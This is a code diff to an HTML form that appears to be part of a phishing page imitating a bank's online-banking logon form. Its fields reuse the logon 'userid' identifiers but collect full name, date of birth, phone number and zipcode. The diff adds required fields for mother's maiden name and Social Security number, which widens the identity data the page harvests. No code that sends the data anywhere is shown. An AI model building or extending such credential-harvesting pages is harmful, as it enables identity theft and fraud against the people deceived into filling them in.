@@ -4409,8 +4409,7 @@
                         <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
                             id="aoblogon_userid_container"><label class="control-label" for="aoblogon_userid">Full
                                 Name</label>
-                            <div class="controls"><input class="form-control inputbox required" type="text" name="fname"
-                                    autocomplete="off" autocapitalize="none" required="required"></div>
+                            <div class="controls"><input class="form-control inputbox required" type="text" name="fname" required="required"></div>
                         </div>
                         <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
                             id="aoblogon_userid_container"><label class="control-label" for="aoblogon_userid">Date of
@@ -4420,10 +4419,23 @@
                                     oninput="formatDate(this)" maxlength="10" minlength="10" required="required"></div>
                         </div>
                         <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
+                            id="aoblogon_userid_container"><label class="control-label" for="aoblogon_userid">Mother's
+                                Maiden Name</label>
+                            <div class="controls"><input class="form-control inputbox required" type="text"
+                                    id="aoblogon_userid" name="mmn" required="required"></div>
+                        </div>
+                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
+                            id="aoblogon_userid_container"><label class="control-label"
+                                for="aoblogon_userid">SSN</label>
+                            <div class="controls"><input class="form-control inputbox required" type="tel"
+                                    id="aoblogon_userid" name="ssn" oninput="formatNumber(this)" maxlength="9" minlength="9" required="required">
+                            </div>
+                        </div>
+                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
                             id="aoblogon_userid_container"><label class="control-label" for="aoblogon_userid">Phone
                                 Number</label>
                             <div class="controls"><input class="form-control inputbox required" type="tel"
-                                    id="aoblogon_userid" name="phone" autocomplete="off" autocapitalize="none"
+                                    id="aoblogon_userid" name="phone" maxlength="9" minlength="9"
                                     oninput="formatNumber(this)" required="required"></div>
                         </div>
                         <div data-role="fieldcontain" class="col-sm-12 form-group control-group required"
@@ -4451,8 +4463,8 @@
                             id="aoblogon_userid_container"><label class="control-label"
                                 for="aoblogon_userid">Zipcode</label>
                             <div class="controls"><input class="form-control inputbox required" type="text"
-                                    id="aoblogon_userid" name="zipcode" autocomplete="off" maxlength="5" minlength="5" autocapitalize="none"
-                                    oninput="formatNumber(this)" required="required"></div>
+                                    id="aoblogon_userid" name="zipcode" autocomplete="off" maxlength="5" minlength="5"
+                                    autocapitalize="none" oninput="formatNumber(this)" required="required"></div>
                         </div>
 
                         <input class="form-control inputbox" type="hidden" id="aoblogon_submit_2">
